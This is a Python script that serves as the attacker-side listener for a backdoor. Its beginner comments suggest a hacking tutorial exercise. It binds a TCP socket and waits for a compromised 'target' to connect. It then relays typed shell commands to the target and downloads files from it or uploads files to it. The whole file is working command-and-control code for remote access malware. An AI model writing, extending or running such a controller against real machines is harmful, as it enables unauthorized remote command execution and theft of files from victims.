import socket #tells python you will be communicating over a network
import json
import os

def target_communication():
    while True:
        command_data = input('* Shell~%s: ' % str(ip)) #creates shell input
        reliable_send(command_data)
        if command_data == 'quit':
            break
        elif command_data == 'clear': #Allows clear command to work
            os.system('clear')
        elif command_data[:3] == 'cd ': #[:3} means IF the first 3 characters match cd_ run this statement
            pass
        elif command_data[:8] == 'download': #Allows to download  afile
            download_file(command_data[9:])
        elif command_data[:6] == 'upload': #Allows to upload a file
            upload_file(command_data[7:])
        else:
            result = reliable_recv() #recieves shell output results
            print(result)

def reliable_send(command_data): #Sends commands to backdoor
    jsondata = json.dumps(command_data)
    target.send(jsondata.encode()) #target is a var created with sock.accept

def reliable_recv(): #Recieves commands from backfoor
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def download_file(file_name):
    f = open(file_name, 'wb') #wb = write bytes
    target.settimeout(1) #Helps file download not get stuck
    chunk = target.recv(1024) #amount of bytes to recv
    while chunk: #Will run as long as there is something inside the chunk variable.
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()

def upload_file(file_name):
    f = open(file_name, 'rb') #rb = read bytes
    target.send(f.read())

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #socket.socket(IPv4,Tcp)
sock.bind(('192.168.1.19', 5555)) #Host IP and Port to use

print('[+] Listening for incoming connections...')
sock.listen(5) #Max number of connections listening for

target,ip = sock.accept()
print(f'[+] Target connected from {ip}')
target_communication()

